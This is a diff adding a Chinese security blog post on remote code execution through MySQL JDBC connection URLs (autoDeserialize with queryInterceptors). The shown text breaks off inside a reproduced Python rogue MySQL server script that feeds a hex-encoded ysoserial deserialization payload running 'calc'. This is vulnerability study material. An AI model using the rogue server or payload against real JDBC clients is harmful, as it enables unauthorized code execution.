@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>JDBC Connection URL RCE - Da22le的博客</title><meta name="Description" content="好好学习 天天向上"><meta property="og:title" content="JDBC Connection URL RCE" />
+<meta property="og:description" content="前言 这几天注意到了有一个JDBC RCE的点，麻利的学习了一下，以下是个人的一些总结，算是为了以后方便自己看，先主要学习了Mysql和Post" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/jdbc-connection-url-rce/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-13T14:15:16+08:00" />
+<meta property="article:modified_time" content="2022-08-13T14:15:16+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content="JDBC Connection URL RCE"/>
+<meta name="twitter:description" content="前言 这几天注意到了有一个JDBC RCE的点，麻利的学习了一下，以下是个人的一些总结，算是为了以后方便自己看，先主要学习了Mysql和Post"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/jdbc-connection-url-rce/" /><link rel="prev" href="/cve-2022-35741-apache-cloudstack-saml-xxe%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "JDBC Connection URL RCE",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/jdbc-connection-url-rce\/"
+        },"image": ["\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  2072 ,
+        "url": "\/jdbc-connection-url-rce\/","datePublished": "2022-08-13T14:15:16+08:00","dateModified": "2022-08-13T14:15:16+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Da22le","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Da22le"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Da22le的博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Da22le</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/">  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Da22le的博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Da22le</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/" title=""></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">JDBC Connection URL RCE</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Da22le</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-08-13">2022-08-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2072 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;<span id="/jdbc-connection-url-rce/" class="leancloud_visitors" data-flag-title="JDBC Connection URL RCE">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#mysql-jdbc-rce">Mysql JDBC RCE</a>
+      <ul>
+        <li><a href="#环境分析">环境分析</a></li>
+        <li><a href="#payloadb不同版本">Payloadb不同版本</a></li>
+      </ul>
+    </li>
+    <li><a href="#postgresql-jdbc-rce">Postgresql JDBC RCE</a></li>
+    <li><a href="#参考连接">参考连接</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="前言">前言</h1>
+<p>这几天注意到了有一个JDBC RCE的点，麻利的学习了一下，以下是个人的一些总结，算是为了以后方便自己看，先主要学习了Mysql和PostgreSQL JDBC RCE的点</p>
+<h1 id="mysql-jdbc-rce">Mysql JDBC RCE</h1>
+<h2 id="环境分析">环境分析</h2>
+<p>先来搭建一下环境，pom加上mysql-connector的依赖，在构建一个JDBC连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>mysql<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>mysql-connector-java<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>8.0.12<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">jdbc_url</span> <span class="o">=</span> <span class="s">&#34;jdbc:mysql://127.0.0.1:3306/test?&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;autoDeserialize=true&#34;</span> <span class="o">+</span>
+                <span class="s">&#34;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span><span class="o">;</span>
+        <span class="n">Connection</span> <span class="n">con</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">jdbc_url</span><span class="o">,</span> <span class="s">&#34;root&#34;</span><span class="o">,</span> <span class="s">&#34;root&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>来看一下JDBC的语句，<code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>，里面有两个参数<code>autoDeserialize</code>和<code>queryInterceptors</code>，<code>autoDeserialize</code>字面意思允许反序列化后面rce的时候需要用到，然后来看一下<code>queryInterceptors</code>这个参数，指定了一个拦截器，在JDBC连接成功后，会优先通过指定的这个拦截器，会经过<code>preProcess</code>和<code>postProcess</code>这两个函数，这两个函数都会调用<code>populateMapWithSessionStatusValues</code>中，可以看到在该函数内执行了<code>SHOW SESSION STATUS</code>sql语句操作，跟进到<code>resultSetToMap</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/450ed1be-1cc1-8579-214c-b1f5189ecf71.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/450ed1be-1cc1-8579-214c-b1f5189ecf71.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/450ed1be-1cc1-8579-214c-b1f5189ecf71.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/450ed1be-1cc1-8579-214c-b1f5189ecf71.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/450ed1be-1cc1-8579-214c-b1f5189ecf71.png"
+        title="1.png" /></p>
+<p>接着进入到<code>getObject</code>中</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/2ea971b8-d605-8a85-2dda-db8347cc1144.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/2ea971b8-d605-8a85-2dda-db8347cc1144.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/2ea971b8-d605-8a85-2dda-db8347cc1144.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/2ea971b8-d605-8a85-2dda-db8347cc1144.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/2ea971b8-d605-8a85-2dda-db8347cc1144.png"
+        title="2.png" /></p>
+<p>熟悉的readObject操作，其中<code>autoDeserialize</code>设置为true是为了过if语句，这里反序列化的数据为执行sql语句后mysql返回的信息，因此可以通过<strong>伪造一个mysql服务器或者篡改返回的数据</strong>，即可达到反序列化rce的操作</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8993ecaf-b0b1-dcf5-37bd-cdb5b7b2de2a.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8993ecaf-b0b1-dcf5-37bd-cdb5b7b2de2a.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8993ecaf-b0b1-dcf5-37bd-cdb5b7b2de2a.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8993ecaf-b0b1-dcf5-37bd-cdb5b7b2de2a.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8993ecaf-b0b1-dcf5-37bd-cdb5b7b2de2a.png"
+        title="3.png" /></p>
+<p>这里放一个网上师傅写的py脚本，伪造了一个mysql服务，payload为cc7构造的弹计算器的命令，这里就不演示了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding=utf-8</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">greeting_data</span><span class="o">=</span><span class="s2">&#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&#34;</span>
+<span class="n">response_ok_data</span><span class="o">=</span><span class="s2">&#34;0700000200000002000000&#34;</span>
+
+<span class="k">def</span> <span class="nf">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Receiveing the package : </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Sending the package : </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">get_payload_content</span><span class="p">():</span>
+    <span class="c1">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span>
+    <span class="n">file</span><span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;payload&#39;</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">payload_content</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()),</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;open successs&#34;</span><span class="p">)</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;open false&#34;</span><span class="p">)</span>
+        <span class="c1">#calc</span>
+        <span class="n">payload_content</span><span class="o">=</span><span class="s1">&#39;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#39;</span>
+    <span class="k">return</span> <span class="n">payload_content</span>
+
+<span class="c1"># 主要逻辑</span>
+<span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+
+    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sk</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Connection come from </span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+
+        <span class="c1"># 1.先发送第一个 问候报文</span>
+        <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">greeting_data</span><span class="p">)</span>
+
+        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+            <span class="c1"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>
+            <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">response_ok_data</span><span class="p">)</span>
+
+            <span class="c1">#其他过程</span>
+            <span class="n">data</span><span class="o">=</span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="c1">#查询一些配置信息,其中会发送自己的 版本号</span>
+            <span class="k">if</span> <span class="s2">&#34;session.auto_increment_increment&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">_payload</span><span class="o">=</span><span class="s1">&#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#39;</span>
+                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">_payload</span><span class="p">)</span>
+                <span class="n">data</span><span class="o">=</span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">elif</span> <span class="s2">&#34;show warnings&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">_payload</span> <span class="o">=</span> <span class="s1">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;</span>
+                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">_payload</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&#34;set names&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">response_ok_data</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&#34;set character_set_results&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">response_ok_data</span><span class="p">)</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s2">&#34;show session status&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+                <span class="n">mysql_data</span> <span class="o">=</span> <span class="s1">&#39;0100000102&#39;</span>
+                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="s1">&#39;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
